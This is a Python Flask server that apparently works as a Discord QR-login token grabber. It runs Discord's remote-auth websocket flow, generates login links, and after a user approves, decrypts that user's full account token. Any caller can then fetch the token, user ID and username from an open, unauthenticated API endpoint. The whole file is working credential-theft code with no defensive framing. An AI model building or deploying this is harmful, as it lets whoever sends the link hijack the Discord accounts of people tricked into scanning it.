import base64
import json
import threading
import time
import requests
import websocket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from flask import Flask, request, jsonify
from flask_cors import CORS
import secrets
import sys
import os
from datetime import datetime, timezone

app = Flask(__name__)
CORS(app)

active_sessions = {}
session_results = {}

def log(msg):
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {msg}")
    sys.stdout.flush()

class DiscordAuthWebsocket:
    WS_ENDPOINT = 'wss://remote-auth-gateway.discord.gg/?v=2'
    LOGIN_ENDPOINT = 'https://discord.com/api/v9/users/@me/remote-auth/login'

    def __init__(self, session_id):
        self.session_id = session_id
        self.key = RSA.generate(2048)
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
        self.heartbeat_interval = None
        self.last_heartbeat = None
        self.current_fingerprint = None
        self.ws = None
        self.should_stop = False
        self.user_data = None

    def run(self):
        log(f"WebSocket started for session {self.session_id}")
        self.ws = websocket.WebSocketApp(
            self.WS_ENDPOINT,
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close,
            header={'Origin': 'https://discord.com'}
        )
        self.ws.run_forever()

    def send(self, op, data=None):
        payload = {'op': op}
        if data:
            payload.update(data)
        if self.ws and self.ws.sock and self.ws.sock.connected:
            self.ws.send(json.dumps(payload))

    def heartbeat_sender(self):
        while not self.should_stop:
            time.sleep(0.5)
            if self.last_heartbeat and self.heartbeat_interval:
                if time.time() - self.last_heartbeat >= self.heartbeat_interval:
                    self.send('heartbeat')
                    self.last_heartbeat = time.time()

    def decrypt_payload(self, encrypted_payload):
        payload = base64.b64decode(encrypted_payload)
        return self.cipher.decrypt(payload)

    def on_open(self, ws):
        pub = self.key.publickey().export_key().decode()
        pub_key = ''.join(pub.split('\n')[1:-1])
        self.send('init', {'encoded_public_key': pub_key})

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            op = data.get('op')

            if op == 'hello':
                self.heartbeat_interval = data.get('heartbeat_interval') / 1000
                self.last_heartbeat = time.time()
                threading.Thread(target=self.heartbeat_sender, daemon=True).start()

            elif op == 'nonce_proof':
                nonce = data.get('encrypted_nonce')
                decrypted = self.decrypt_payload(nonce)
                proof = SHA256.new(decrypted).digest()
                proof = base64.urlsafe_b64encode(proof).decode().rstrip('=')
                self.send('nonce_proof', {'proof': proof})

            elif op == 'pending_remote_init':
                self.current_fingerprint = data.get('fingerprint')
                auth_url = f"https://discord.com/ra/{self.current_fingerprint}"
                active_sessions[self.session_id] = auth_url
                log(f"Session {self.session_id} -> {auth_url}")

            elif op == 'pending_ticket':
                encrypted_payload = data.get('encrypted_user_payload')
                payload = self.decrypt_payload(encrypted_payload).decode()
                values = payload.split(':')
                self.user_data = {
                    'id': values[0],
                    'discriminator': values[1],
                    'avatar': values[2],
                    'username': values[3]
                }
                log(f"Session {self.session_id} user: {values[3]}#{values[1]}")

            elif op == 'pending_login':
                ticket = data.get('ticket')
                log(f"Session {self.session_id} exchanging ticket...")
                try:
                    resp = requests.post(self.LOGIN_ENDPOINT, json={'ticket': ticket}, timeout=10)
                    if resp.status_code == 200:
                        encrypted_token = resp.json().get('encrypted_token')
                        token = self.decrypt_payload(encrypted_token).decode()
                        self.user_data['token'] = token
                        session_results[self.session_id] = self.user_data
                        log(f"Session {self.session_id} token obtained")
                        self.should_stop = True
                        ws.close()
                    else:
                        log(f"Token exchange failed: {resp.text}")
                except Exception as e:
                    log(f"Token exchange error: {e}")

        except Exception as e:
            log(f"WebSocket message error: {e}")

    def on_error(self, ws, error):
        log(f"WebSocket error: {error}")

    def on_close(self, ws, status, msg):
        log(f"WebSocket closed: {status} {msg}")

    @property
    def public_key(self):
        pub = self.key.publickey().export_key().decode()
        return ''.join(pub.split('\n')[1:-1])

# ---------- Flask API ----------
@app.route('/')
def home():
    return jsonify({'status': 'ok', 'service': 'Discord Auth Server'})

@app.route('/api/create_session', methods=['POST'])
def create_session():
    session_id = secrets.token_urlsafe(16)
    log(f"Create session {session_id}")

    ws_client = DiscordAuthWebsocket(session_id)
    thread = threading.Thread(target=ws_client.run, daemon=False)  # important: not daemon
    thread.start()

    # Wait for fingerprint (max 10 sec)
    auth_url = None
    for _ in range(50):
        if session_id in active_sessions:
            auth_url = active_sessions.pop(session_id)
            break
        time.sleep(0.2)

    if auth_url:
        log(f"Session {session_id} created: {auth_url}")
        return jsonify({'session_id': session_id, 'auth_url': auth_url, 'status': 'pending'})
    else:
        log(f"Session {session_id} failed")
        return jsonify({'error': 'Failed to generate link'}), 500

@app.route('/api/check_status/<session_id>', methods=['GET'])
def check_status(session_id):
    if session_id in session_results:
        user_data = session_results.pop(session_id)
        log(f"Session {session_id} completed, returning token")
        return jsonify({'status': 'completed', 'user_data': user_data})
    return jsonify({'status': 'pending'})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    log(f"Starting auth server on port {port}")
    app.run(host='0.0.0.0', port=port, threaded=True, debug=False)
